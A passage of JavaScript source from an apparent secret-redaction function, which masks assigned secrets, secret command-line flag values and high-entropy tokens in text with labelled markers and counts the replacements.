  out = replaceCounting(
    out,
    ASSIGNMENT_RE,
    // The name starts a token by construction (group 1), so no boundary check here.
    (_m, g, offset, whole) => {
      const [boundary, q1, name, q2, sep, openQuote, quotedValue, bareValue] = g;
      const quoted = openQuote !== "";
      let value = quoted ? quotedValue : bareValue;
      // `${NAME:-default}` / `${NAME:=default}`: the default is the value, and a
      // default that is itself `$OTHER` is a reference, not a literal.
      if (!quoted && boundary === "{" && offset > 0 && whole[offset - 1] === "$" && sep === ":") value = value.replace(/^[-=+?]/, "");
      const urlQuery = boundary === "?" || boundary === "&";
      const colon = sep.trim() === ":";
      const spaced = colon || /\s/.test(sep);
      if (!assignmentValueIsSecret(name, value, { quoted, spaced, urlQuery, colon })) return null;
      return `${boundary}${q1}${name}${q2}${sep}${quoted ? openQuote : ""}${marker("assigned secret")}`;
    },
    c,
  );
  out = replaceCounting(
    out,
    FLAG_VALUE_RE,
    // Group 1 rules out `x--token` and the `-b` of `a-b c`.
    (_m, g) => {
      const [boundary, flag, space, quote, quotedValue, bareValue] = g;
      const quoted = quote !== "";
      const value = quoted ? quotedValue : bareValue;
      if (!assignmentValueIsSecret(flag, value, { quoted, spaced: true, urlQuery: false, flag: true })) return null;
      return `${boundary}${flag}${space}${quote}${marker("assigned secret")}`;
    },
    c,
  );

  // 8. Anything left that looks generated.
  out = replaceCounting(
    out,
    LONG_TOKEN_RE,
    (m, _g, offset, whole) => (looksRandomToken(m) && !insideDigest(whole, offset) ? marker("high-entropy token") : null),
    c,
    "skip",
  );

  return { text: out, count: c.n, found: c.found };
}
